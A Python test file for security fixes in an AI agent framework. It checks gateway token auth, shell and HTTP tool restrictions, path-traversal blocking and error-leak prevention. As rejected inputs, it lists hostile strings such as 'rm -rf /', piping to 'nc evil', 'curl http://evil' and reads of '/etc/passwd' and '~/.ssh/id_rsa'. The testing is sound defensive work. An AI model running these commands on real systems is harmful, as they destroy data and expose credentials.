"""Phase 12 code review 修复的单测。"""
from __future__ import annotations

import os
import tempfile
from pathlib import Path

import pytest


# ─────── SEC-1 网关鉴权 ───────

def test_gateway_auth_blocks_without_token(monkeypatch):
    monkeypatch.setenv("OPENCLAW_GATEWAY_TOKEN", "secret-abc")
    from fastapi.testclient import TestClient
    from openclaw.gateway.app import create_app
    from openclaw.gateway import deps as deps_mod
    deps_mod.reset_deps()
    from tests.test_phase8 import FakeAgentLoop
    d = deps_mod.GatewayDeps(agent_loop=FakeAgentLoop())
    deps_mod.set_deps(d)
    try:
        client = TestClient(create_app(deps=d))
        r = client.get("/v1/memory/short?scope=s1")
        assert r.status_code == 401
        assert "WWW-Authenticate" in r.headers
    finally:
        deps_mod.reset_deps()


def test_gateway_auth_accepts_valid_token(monkeypatch):
    monkeypatch.setenv("OPENCLAW_GATEWAY_TOKEN", "secret-abc,secret-xyz")
    from fastapi.testclient import TestClient
    from openclaw.gateway.app import create_app
    from openclaw.gateway import deps as deps_mod
    deps_mod.reset_deps()
    from tests.test_phase8 import FakeAgentLoop
    d = deps_mod.GatewayDeps(agent_loop=FakeAgentLoop())
    deps_mod.set_deps(d)
    try:
        client = TestClient(create_app(deps=d))
        r = client.get(
            "/v1/memory/short?scope=s1",
            headers={"Authorization": "Bearer secret-xyz"},
        )
        assert r.status_code in (200, 404)
        r2 = client.get(
            "/v1/memory/short?scope=s1",
            headers={"X-Gateway-Token": "secret-abc"},
        )
        assert r2.status_code in (200, 404)
    finally:
        deps_mod.reset_deps()


def test_gateway_auth_skips_public_paths(monkeypatch):
    monkeypatch.setenv("OPENCLAW_GATEWAY_TOKEN", "secret-abc")
    from fastapi.testclient import TestClient
    from openclaw.gateway.app import create_app
    from openclaw.gateway import deps as deps_mod
    deps_mod.reset_deps()
    from tests.test_phase8 import FakeAgentLoop
    d = deps_mod.GatewayDeps(agent_loop=FakeAgentLoop())
    deps_mod.set_deps(d)
    try:
        client = TestClient(create_app(deps=d))
        # 公共路径不应 401
        r = client.get("/healthz")
        assert r.status_code != 401
        r2 = client.get("/")
        assert r2.status_code != 401
    finally:
        deps_mod.reset_deps()


# ─────── SEC-3 shell ───────

def test_shell_tool_rejects_metachars():
    import asyncio
    from openclaw.tools.registry import ToolRegistry
    from openclaw.tools.builtin.shell import register_shell_tools
    reg = ToolRegistry()
    register_shell_tools(reg, default_cwd="/tmp", allowed=["ls", "cat"])
    fn = reg.get("shell_exec")

    async def _run():
        for bad in ["ls && rm -rf /", "ls; cat /etc/passwd", "ls | nc evil", "ls > /etc/hosts", "ls `whoami`"]:
            with pytest.raises(PermissionError):
                await fn(command=bad)
    asyncio.run(_run())


def test_shell_tool_rejects_newline():
    import asyncio
    from openclaw.tools.registry import ToolRegistry
    from openclaw.tools.builtin.shell import register_shell_tools
    reg = ToolRegistry()
    register_shell_tools(reg, default_cwd="/tmp", allowed=["ls"])
    fn = reg.get("shell_exec")

    async def _run():
        with pytest.raises(PermissionError):
            await fn(command="ls\nrm -rf /")
    asyncio.run(_run())


def test_shell_tool_rejects_unknown_command_in_strict():
    import asyncio
    from openclaw.tools.registry import ToolRegistry
    from openclaw.tools.builtin.shell import register_shell_tools
    reg = ToolRegistry()
    register_shell_tools(reg, default_cwd="/tmp", allowed=["ls"])
    fn = reg.get("shell_exec")

    async def _run():
        with pytest.raises(PermissionError):
            await fn(command="curl http://evil")
        # 注意:/bin/ls 的 basename 是 ls,合法白名单里允许(设计上白名单按 basename 匹配)
    asyncio.run(_run())


# ─────── SEC-7 http tool ───────

def test_http_tool_rejects_when_no_allowlist():
    import asyncio
    from openclaw.tools.registry import ToolRegistry
    from openclaw.tools.builtin.http import register_http_tools
    reg = ToolRegistry()
    register_http_tools(reg)  # 没传 allowed_hosts
    fn = reg.get("http_get")

    async def _run():
        with pytest.raises(PermissionError):
            await fn(url="https://example.com")
    asyncio.run(_run())


def test_http_tool_rejects_private_ip():
    import asyncio
    from openclaw.tools.registry import ToolRegistry
    from openclaw.tools.builtin.http import register_http_tools
    reg = ToolRegistry()
    register_http_tools(reg, allowed_hosts=["localhost"], timeout=2)
    fn = reg.get("http_get")

    async def _run():
        with pytest.raises(PermissionError):
            await fn(url="http://127.0.0.1/")
    asyncio.run(_run())


def test_http_tool_rejects_unknown_scheme():
    import asyncio
    from openclaw.tools.registry import ToolRegistry
    from openclaw.tools.builtin.http import register_http_tools
    reg = ToolRegistry()
    register_http_tools(reg, allowed_hosts=["example.com"])
    fn = reg.get("http_get")

    async def _run():
        with pytest.raises(PermissionError):
            await fn(url="file:///etc/passwd")
        with pytest.raises(PermissionError):
            await fn(url="ftp://example.com/")
    asyncio.run(_run())


# ─────── SEC-8 fs tool 路径穿越 ───────

def test_fs_tool_rejects_dotdot():
    import asyncio
    from openclaw.tools.registry import ToolRegistry
    from openclaw.tools.builtin.fs import register_fs_tools
    with tempfile.TemporaryDirectory() as tmp:
        reg = ToolRegistry()
        register_fs_tools(reg, root=tmp)
        fn = reg.get("read_file")

        async def _run():
            for bad in ["../etc/passwd", "a/../../etc/passwd", "a/..", "/etc/passwd", "~/.ssh/id_rsa"]:
                with pytest.raises(PermissionError):
                    await fn(path=bad)
        asyncio.run(_run())


def test_fs_tool_rejects_glob_with_dotdot():
    import asyncio
    from openclaw.tools.registry import ToolRegistry
    from openclaw.tools.builtin.fs import register_fs_tools
    with tempfile.TemporaryDirectory() as tmp:
        reg = ToolRegistry()
        register_fs_tools(reg, root=tmp)
        fn = reg.get("search_files")

        async def _run():
            with pytest.raises(PermissionError):
                await fn(path=".", pattern="a/../b")
        asyncio.run(_run())


# ─────── MEM-2 scope 文件名 hash ───────

def test_short_term_scope_filename_is_hashed():
    from openclaw.memory.short_term import _safe_scope_name
    # 同样 scope → 同样 hash(确定性)
    a = _safe_scope_name("session:abc")
    b = _safe_scope_name("session:abc")
    assert a == b
    # 不同 scope → 不同
    c = _safe_scope_name("session:xyz")
    assert a != c
    # 含 .. 的 scope 也走 hash 路径
    d = _safe_scope_name("../../../etc/passwd")
    assert "/" not in d
    assert len(d) == 16  # sha256 hex prefix


def test_short_term_clear_path_traversal_blocked():
    from openclaw.memory.short_term import ShortTermStore
    with tempfile.TemporaryDirectory() as tmp:
        st = ShortTermStore(tmp)
        st.append("session:abc", "hi", "hello")
        # 注入恶意 scope,不应能逃出 tmp
        st.clear("../../../etc")
        # tmp 目录里不应出现 escape
        names = list(Path(tmp).iterdir())
        for n in names:
            assert str(n.resolve()).startswith(str(Path(tmp).resolve()))


# ─────── SEC-5 approver confirm ───────

def test_tools_set_approver_requires_confirm(monkeypatch):
    monkeypatch.setenv("OPENCLAW_GATEWAY_TOKEN", "")
    monkeypatch.setenv("OPENCLAW_GATEWAY_ADMIN_TOKEN", "admin-secret")  # H2: admin token
    from fastapi.testclient import TestClient
    from openclaw.gateway.app import create_app
    from openclaw.gateway import deps as deps_mod
    deps_mod.reset_deps()
    from tests.test_phase8 import FakeAgentLoop
    d = deps_mod.GatewayDeps(agent_loop=FakeAgentLoop())
    deps_mod.set_deps(d)
    try:
        client = TestClient(create_app(deps=d))
        # H2: 需要 X-Admin-Token header
        r = client.post("/v1/tools/approver", json={"approved": True},
                        headers={"X-Admin-Token": "admin-secret"})
        assert r.status_code == 403
        assert "CONFIRM" in r.text
    finally:
        deps_mod.reset_deps()


# ─────── SEC-4 config env 插值 ───────

def test_config_interp_env():
    from openclaw.core.config import _interp_env
    os.environ["MY_TEST_KEY"] = "abc123"
    try:
        out = _interp_env({"x": "${MY_TEST_KEY}", "y": "${MISSING:-fallback}"})
        assert out["x"] == "abc123"
        assert out["y"] == "fallback"
        # 缺省时返回空串 + 警告
        out2 = _interp_env({"z": "${MISSING_NO_DEFAULT}"})
        assert out2["z"] == ""
    finally:
        del os.environ["MY_TEST_KEY"]


def test_config_load_yaml_with_env_interp(tmp_path):
    from openclaw.core.config import ConfigLoader
    cfg = tmp_path / "test.yaml"
    cfg.write_text(
        "providers:\n  - name: x\n    model: m1\n    api_key: ${MY_PROVIDER_KEY:-default}\n",
        encoding="utf-8",
    )
    os.environ["MY_PROVIDER_KEY"] = "real-secret"
    try:
        loader = ConfigLoader(cfg)
        c = loader.load()
        # Phase 25/b9:api_key 改 SecretStr,需 .get_secret_value() 取明文
        assert c.providers[0].api_key.get_secret_value() == "real-secret"
    finally:
        del os.environ["MY_PROVIDER_KEY"]


# ─────── SEC-11 异常不外露 ───────

def test_gateway_500_does_not_leak_internals(monkeypatch):
    """通过 /v1/tools/call 让 FakeAgentLoop 内部抛错 → 500 不外露。"""
    monkeypatch.setenv("OPENCLAW_GATEWAY_TOKEN", "")
    from fastapi.testclient import TestClient
    from openclaw.gateway.app import create_app
    from openclaw.gateway import deps as deps_mod

    class BoomRegistry:
        specs = []
        def set_approver(self, fn): pass
        async def call(self, name, arguments):
            raise RuntimeError("SECRET-LEAK-DO-NOT-EXPOSE 内部密钥:sk-xxxx")

    class BoomLoop:
        def __init__(self):
            self.tools = BoomRegistry()
            self.memory = type("M", (), {"short": None, "long": None, "soul": None})()
            self.system_prompt = ""
        async def handle(self, *a, **kw): pass
        async def new_session(self, sid=None): return sid or "s"

    deps_mod.reset_deps()
    d2 = deps_mod.GatewayDeps(agent_loop=BoomLoop())
    deps_mod.set_deps(d2)
    try:
        client2 = TestClient(create_app(deps=d2), raise_server_exceptions=False)
        r = client2.post("/v1/tools/call", json={"name": "x", "arguments": {}})
        assert r.status_code == 500
        # 不应包含 SECRET-LEAK 或 sk-xxxx
        assert "SECRET-LEAK" not in r.text
        assert "sk-xxxx" not in r.text
        # 应有 error_id
        body = r.json()
        assert "error_id" in (body.get("detail", {}) if isinstance(body.get("detail"), dict) else str(body))
    finally:
        deps_mod.reset_deps()
